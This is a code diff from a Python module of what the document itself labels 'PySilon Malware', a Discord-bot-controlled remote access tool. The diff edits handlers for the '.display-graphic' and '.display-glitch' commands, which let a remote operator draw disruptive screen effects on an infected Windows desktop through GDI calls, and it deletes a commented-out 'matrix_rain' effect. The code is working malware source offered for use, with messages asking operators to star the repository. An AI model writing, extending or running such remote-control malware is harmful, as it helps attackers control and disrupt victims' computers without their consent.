@@ -13,28 +13,31 @@ import os
 # on message
 elif message.content == '.display-graphic':
     await message.delete()
-    embed = discord.Embed(title='📤 Provide a file containing graphic', description='Just send it in next message', colour=discord.Colour.blue())
+    embed = discord.Embed(title='📤 Provide a file containing graphic', description='Send your .drawdata file here', colour=discord.Colour.blue())
     embed.set_author(name='PySilon Malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
     await message.channel.send(embed=embed)
     expectation = 'graphic_file'
     
-elif message.content == '.display-glitch':
+elif message.content[:15] == '.display-glitch':
     await message.delete()
     if message.content.strip() == '.display-glitch':
         embed = discord.Embed(title="📛 Error",description='```Syntax: .display-glitch <glitch_name>\nTo list all currently available glitches, type .display-glitch list```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
         #.log Sent message with usage of ".show" 
-    elif message.content.replace('.display-glitch ', '') == 'list':
+    elif message.content[16:] == 'list':
         embed = discord.Embed(title="📃 List of currently available glitches:", description=f'- {"- ".join(flash_screen("list"))}\n`NOTE: This list will dramatically increase it\'s size in release v4.1`', colour=discord.Colour.blue())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
-    elif message.content.replace('.display-glitch ', '') + '\n' in flash_screen('list'):
-        flash_screen(message.content.replace('.display-glitch ', ''))
+    elif message.content[16:] + '\n' in flash_screen('list'):
+        flash_screen(message.content[16:])
         embed = discord.Embed(title="🟢 Glitch succesfully executed", description=f'Remember to ⭐ our repository', colour=discord.Colour.blue())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
-
+    else:
+        embed = discord.Embed(title="📛 Error",description='```Invalid argument!```', colour=discord.Colour.red())
+        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
 
 elif expectation == 'graphic_file':
     try:
@@ -52,8 +55,6 @@ elif expectation == 'graphic_file':
     except Exception as err: 
         await message.channel.send(f'```❗ Something went wrong while fetching graphic file...\n{str(err)}```')
         expectation = None
-
-
 
 # anywhere
 class screen_manipulator:
@@ -166,38 +167,6 @@ def flash_screen(effect):
             SelectObject(hdc, brush)
             PatBlt(hdc, 0, y, x, 1, PATCOPY)
             DeleteObject(brush)
-    
-    #elif effect == 'matrix_rain':
-    #    character_set = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()"
-    #    for _ in range(x * y // 20):
-    #        rand_x = random.randint(0, x)
-    #        rand_y = random.randint(0, y)
-    #        color = RGB(random.randrange(1), random.randrange(1), random.randrange(1))
-    #        text = random.choice(character_set)
-    #        
-    #        font = LOGFONT()
-    #        font.lfHeight = 40
-    #        font.lfWeight = 400
-    #        font.lfItalic = 0
-    #        font.lfUnderline = 0
-    #        font.lfStrikeOut = 0
-    #        font.lfCharSet = DEFAULT_CHARSET
-    #        font.lfOutPrecision = OUT_OUTLINE_PRECIS
-    #        font.lfClipPrecision = CLIP_DEFAULT_PRECIS
-    #        font.lfQuality = ANTIALIASED_QUALITY
-    #        font.lfPitchAndFamily = VARIABLE_PITCH
-    #        font.lfFaceName = "Courier New"
-    #
-    #        hdc = GetDC(0)
-    #        hfont = CreateFontIndirect(font)
-    #        SelectObject(hdc, hfont)
-    #
-    #        SetBkMode(hdc, TRANSPARENT)
-    #        SetTextColor(hdc, color)
-    #        ExtTextOut(hdc, rand_x, rand_y, 0, None, text)
-    #
-    #        DeleteObject(hfont)
-    #        ReleaseDC(0, hdc)
 
     elif effect == 'snowfall':
         for i in range(10):
